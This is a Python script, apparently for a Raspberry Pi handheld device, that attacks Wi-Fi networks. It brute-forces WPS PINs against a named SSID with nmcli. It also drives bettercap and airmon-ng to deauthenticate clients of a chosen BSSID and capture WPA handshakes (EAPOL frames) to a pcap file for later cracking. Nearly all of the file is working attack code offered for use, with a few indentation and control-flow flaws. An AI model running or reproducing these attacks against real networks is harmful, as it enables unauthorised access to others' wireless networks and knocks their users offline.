from lib.mojstd import *
import RPi.GPIO as GPIO
import os
import subprocess
import time
import random
import subprocess
import time

def generate():
    for var in range(0, 100000000):
        yield f"{var:08d}"  

def connect(ssid, pin):
    try:
        result = subprocess.run(
            ["nmcli", "dev", "wifi", "connect", ssid, "--wps-pin", pin],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        if "successfully activated" in result.stdout.lower():
            ui_print(f"Connected'{ssid}' \n PIN: {pin}")
            return True
        else:
            print(f"PIN {pin} fallito.")
            return False
    except Exception as e:
        ui_print(f"Error {pin}:\n {e}")
        return False

def brute_force_wps(ssid):
    for pin in generate():
        if connect(ssid, pin):
            ui_print(f"PIN : {pin}")
            break
        time.sleep(0.1) 




# network_ssid = getinput() 
# brute_force_wps(network_ssid)
 

bk_ = 0

class CapHandshakes():
    def __init__(self, INTERFACE):
        self.bettercap_process = subprocess.Popen(
            ['sudo', 'bettercap', '-iface', f'{INTERFACE}'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1 
        )

    def bk(self):
        if GPIO.input(KEY3_PIN) == 0:
            return True

    def interface_select(self, INTERFACE):
        test = os.popen(f"iwconfig {INTERFACE} ")
        out = test.read()


        if "No such device" in out:
            return 1

        else:
            pass
            return 0

    def interface_start(self, INTERFACE):
        bk_ = 0
        time.sleep(0.5)
        os.system(f"sudo airmon-ng start {INTERFACE}")
        if self.bk() == True:
            bk_ = 1
            return bk_

    def initialization(self, selected_bssid, INTERFACE):
        bk_ = 0
        commands = [
            'wifi.recon on',
            'wifi.show',
            'set wifi.recon channel 8',
            'set net.sniff.verbose true',
            'set net.sniff.filter ether proto 0x888e',
            f'set net.sniff.output wpa({selected_bssid}).pcap',
            'net.sniff on',
            f'wifi.deauth {selected_bssid}'
        ]

        self.__init__(INTERFACE)
        time.sleep(0.5)
        for i in commands:
            print(f"loop {i}")
            #key3
            if self.bk() == True:
            	print("why")
                killwhile = 1
                return killwhile
                break
		
            time.sleep(2)
            ui_print(f"Loading ({commands.index(i)})...", 0.5)
            self.bettercap_process.stdin.write(i+'\n')

            #key3
            if self.bk() == True:
                print("why")
                killwhile = 1
                return killwhile
                break

            self.bettercap_process.stdin.flush()
            ui_print("Capturing handshakes...", 1)
            #Write output
            with open("output.txt", 'a') as file:
                file.write(self.bettercap_process.stdout.readline())

        return 2
